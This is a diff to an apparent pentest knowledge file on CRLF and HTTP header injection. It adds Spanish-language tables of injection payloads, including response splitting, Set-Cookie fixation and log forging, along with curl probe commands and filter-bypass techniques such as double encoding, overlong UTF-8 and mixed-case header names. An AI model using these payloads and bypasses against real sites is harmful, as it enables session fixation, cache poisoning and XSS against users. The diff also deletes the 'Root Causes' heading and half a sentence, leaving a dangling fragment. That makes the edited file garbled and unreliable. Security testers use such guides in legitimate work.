@@ -86,9 +86,60 @@ chains_with: [cache-poisoning, clickjacking, email-injection]
   ffuf -u "https://target.com/redirect?next=FUZZ" -w crlf_payloads.txt -mc all -fr "Location: /dashboard$"
   ```
 
-## Root Causes
+## Payloads & Detection Patterns
 
-- User input concatenated directly into a raw header string before being written to the response, without stripping/rejecting CR (`\r`, `%0d`) and LF (`\n`, `%0a`).
+Guía de caza: una familia por sink (header, cookie, log). El marcador inyectado va único por
+request para que un hit sea inequívoco en los headers crudos (`curl -i`/Burp raw), nunca en el body.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Raw CRLF | `%0d%0a`, `%0D%0A`, `\r\n` | Abrir un header nuevo en `Location:`/`Set-Cookie:` |
+| LF-only | `%0a`, `\n` | Parsers laxos que separan con un solo LF |
+| CR-only | `%0d`, `\r` | Sinks que cortan la línea con CR solo |
+| Double-encoded | `%250d%250a` | Flaw decode→validate→decode (doble decodificación) |
+| Unicode/overlong | `%E5%98%8D%E5%98%8A`, `%u000d%u000a` | Decoders legacy que colapsan a CR/LF |
+| Response splitting | `%0d%0a%0d%0a<marker-body>` | Línea en blanco → segundo response/body (XSS) |
+| Set-Cookie injection | `%0d%0aSet-Cookie:%20admin=true` | Fijar cookie/sesión en la víctima |
+| Header smuggling | `%0d%0aX-Injected:%201` | Confirmar el sink con header marcador único |
+| Log line injection | `%0d%0a[INFO]%20fake%20line` | Forjar entrada de log (requiere ver el sink) |
+
+Surface signals que delatan la clase antes de inyectar:
+- Params `next`, `redirect`, `return_to`, `url`, `goto`, `lang` reflejados en `Location:`/`Set-Cookie:`.
+- Respuestas 3xx con el valor del param dentro de `Location:` verbatim.
+- Stacks legacy sin validación de header value (Java `sendRedirect` viejo, Go <1.18, PHP antiguo).
+- Campos logueados verbatim: username en login fallido, `User-Agent`, `X-Forwarded-For`, `Referer`.
+
+```bash
+# marcador único por request para dedup inequívoco en headers crudos
+M="X-Q$(date +%s)"
+curl -s -i "https://target/redirect?next=/x%0d%0a${M}:%201"    | grep -i "^${M}:"   # header parsed = hit
+curl -s -i "https://target/redirect?next=/x%250d%250a${M}:%201" | grep -i "^${M}:"   # double-encoded
+curl -s -i "https://target/redirect?next=/x%0a${M}:%201"        | grep -i "^${M}:"   # LF-only
+```
+
+```bash
+# oráculo de response splitting: dos CRLF → body inyectado tras la línea en blanco
+curl -s -i "https://target/redirect?next=/x%0d%0a%0d%0a<marker-body>" | sed -n '/^\r\{0,1\}$/,$p'
+```
+
+Log injection es ciego por defecto: sin acceso autorizado al log store o a un visor del SIEM, la
+línea forjada queda **Inferred**; eleva a **Demonstrated** solo mostrando la entrada multi-línea
+tal cual aterriza en el sink real.
+
+## Bypass Techniques
+
+Agrupadas por el filtro que evaden; probar la familia completa antes de declarar no-inyectable.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Strip de `\r\n` literal | Solo-LF `%0a` o solo-CR `%0d` | Algunos sinks cortan la línea con un único char |
+| Una sola decodificación | Double-encode `%250d%250a` | App decodifica dos veces antes de escribir el header |
+| Normalización de charset | Overlong UTF-8 `%E5%98%8D%E5%98%8A`, `%u000d` | Decoders legacy colapsan la secuencia a CR/LF |
+| Validación solo en path | Mover la inyección al verb/path `/%0d%0aX:/` | Sink en un header de error/debug |
+| Rechazo a nivel param | Reflejar vía header de request logueado a response | WAF/validador de param no cubre headers |
+| Blocklist de `Set-Cookie` | Mixed case `sEt-cOokie`, espacios extra | Header es case-insensitive; regex ingenua no |
+
+ before being written to the response, without stripping/rejecting CR (`\r`, `%0d`) and LF (`\n`, `%0a`).
 - Framework-level redirect/cookie helpers that predate strict header-value validation, or custom header-setting code that bypasses the framework's safe helper.
 - Logging code using string formatting/concatenation of user input directly into a log line template instead of structured logging (fields, not free text).
 
